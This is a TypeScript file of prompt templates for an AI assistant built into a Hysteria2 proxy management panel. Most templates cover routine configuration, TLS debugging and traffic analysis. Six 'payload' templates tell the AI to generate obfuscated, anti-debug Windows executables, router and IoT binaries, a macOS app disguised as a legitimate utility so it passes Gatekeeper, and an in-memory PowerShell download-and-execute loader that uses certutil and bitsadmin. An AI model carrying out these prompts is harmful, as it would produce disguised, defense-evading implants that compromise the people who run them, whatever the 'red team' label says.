import type { AiTemplate } from "@/lib/ai/types"

export const AI_TEMPLATES: AiTemplate[] = [
  {
    id: "optimize-packet-loss",
    label: "Optimize for high packet loss",
    description:
      "Generate a Hysteria2 config tuned for networks with high packet loss (satellite, mobile, congested links).",
    prompt:
      "Generate an optimized Hysteria2 server config for a network with high packet loss (10-30%). Use aggressive QUIC tuning, salamander obfuscation, and suggest appropriate bandwidth limits. Include comments explaining each optimization choice.",
    category: "config",
  },
  {
    id: "debug-tls",
    label: "Debug TLS certificate issues",
    description:
      "Run diagnostics on TLS configuration and suggest fixes for certificate problems.",
    prompt:
      "Troubleshoot my Hysteria2 TLS setup. Check the current server config for TLS issues, review recent logs for certificate errors, and suggest fixes. Focus on ACME/Let's Encrypt problems, certificate expiry, and domain mismatch issues.",
    category: "troubleshoot",
  },
  {
    id: "generate-subscription",
    label: "Generate subscription for user group",
    description:
      "List current users and nodes, then help generate subscription URLs for a group of users.",
    prompt:
      "Help me set up subscription URLs for my users. First, list the current nodes and users. Then explain how to generate subscription URLs that include the running nodes, and suggest the best format (Clash Meta, sing-box, or Hysteria2 native) for each platform.",
    category: "management",
  },
  {
    id: "rotate-stale-passwords",
    label: "Rotate stale node auth tokens",
    description:
      "Identify nodes with potentially stale authentication tokens and recommend rotation.",
    prompt:
      "Check all managed nodes and identify any that might need auth token rotation. List the nodes, their status, and when they were last updated. Suggest a rotation plan for any that look stale (not updated recently).",
    category: "management",
  },
  {
    id: "analyze-traffic",
    label: "Analyze current traffic patterns",
    description:
      "Pull live traffic data and identify anomalies, top users, and unusual patterns.",
    prompt:
      "Analyze the current traffic on my Hysteria2 infrastructure. Show me the top bandwidth consumers, total throughput, online client count, and flag any anomalies (expired users still connected, unusually high bandwidth, etc.).",
    category: "traffic",
  },
  {
    id: "suggest-masquerade",
    label: "Suggest masquerade configuration",
    description:
      "Get recommendations for masquerade proxy targets that blend with legitimate TLS traffic.",
    prompt:
      "Suggest masquerade configurations for my Hysteria2 nodes. Show me options across different categories (CDN, video streaming, cloud providers, general) and recommend the best choice for blending with normal TLS traffic. Then generate a sample server config snippet with the recommended masquerade settings.",
    category: "config",
  },
  {
    id: "throughput-diagnosis",
    label: "Diagnose low throughput",
    description:
      "Investigate why throughput might be lower than expected.",
    prompt:
      "I'm experiencing lower throughput than expected on my Hysteria2 setup. Run a full troubleshoot focusing on throughput issues. Check bandwidth limits, server status, and current traffic load. Suggest optimizations to improve speed.",
    category: "troubleshoot",
  },
  {
    id: "new-node-config",
    label: "Configure a new node",
    description:
      "Generate a complete server config for a new Hysteria2 node with best practices.",
    prompt:
      "Generate a production-ready Hysteria2 server configuration for a new node. Use ACME TLS with Let's Encrypt, salamander obfuscation, sensible bandwidth limits (100 Mbps up, 500 Mbps down), and a CDN masquerade. Include the traffic stats API and HTTP auth backend configuration. Also list the available profiles I can apply to this node.",
    category: "config",
  },
  {
    id: "payload-windows-stealth",
    label: "Build stealth Windows payload",
    description:
      "Generate an obfuscated Windows EXE with heavy obfuscation for red team operations.",
    prompt:
      "Generate a stealth Windows EXE payload with heavy obfuscation (string encoding, control flow, anti-debug). The payload should connect to our Hysteria2 infrastructure with auto-reconnect enabled. Include code signing if available. Explain the obfuscation techniques used and estimated build time.",
    category: "payload",
  },
  {
    id: "payload-linux-embedded",
    label: "Build Linux ELF for embedded systems",
    description:
      "Create a lightweight Linux payload for routers/IoT devices with static linking.",
    prompt:
      "Generate a lightweight Linux ELF payload optimized for embedded systems (routers, IoT). Use static linking with musl libc, minimal footprint, and light obfuscation. The binary should run on ARM and x86 architectures if possible. Explain the size optimization techniques.",
    category: "payload",
  },
  {
    id: "payload-macos-signed",
    label: "Build signed macOS app bundle",
    description:
      "Create a notarized macOS application bundle that passes Gatekeeper checks.",
    prompt:
      "Generate a macOS application bundle (Universal Binary for Intel + Apple Silicon) with code signing and notarization. The app should appear as a legitimate utility to pass Gatekeeper checks. Include proper Info.plist, app icon placeholders, and entitlements. Explain the signing requirements.",
    category: "payload",
  },
  {
    id: "payload-powershell-lotl",
    label: "Build PowerShell Living-off-the-Land",
    description:
      "Create a PowerShell script using native Windows tools for stealth execution.",
    prompt:
      "Generate a PowerShell payload that uses Living-off-the-Land techniques (certutil, bitsadmin, WMI) for stealth execution. Apply multiple layers of encoding and obfuscation. The script should download and execute the Hysteria2 client in memory without touching disk. Explain the LotL techniques used.",
    category: "payload",
  },
  {
    id: "payload-python-cross-platform",
    label: "Build cross-platform Python payload",
    description:
      "Create a Python payload that works on Windows, Linux, and macOS with asyncio.",
    prompt:
      "Generate a cross-platform Python payload using asyncio for concurrent connections. Include auto-reconnect logic, heartbeat keepalives, and fallback server support. Add bytecode obfuscation and explain how to bundle it with PyInstaller for distribution.",
    category: "payload",
  },
  {
    id: "list-payloads",
    label: "List my payload builds",
    description:
      "Show all payload builds with their current status and download links.",
    prompt:
      "List all my payload builds. Show the status of each (pending, building, ready, failed), their platform types, sizes, and provide download links for the ones that are ready. Also show any build errors for failed payloads.",
    category: "payload",
  },
]
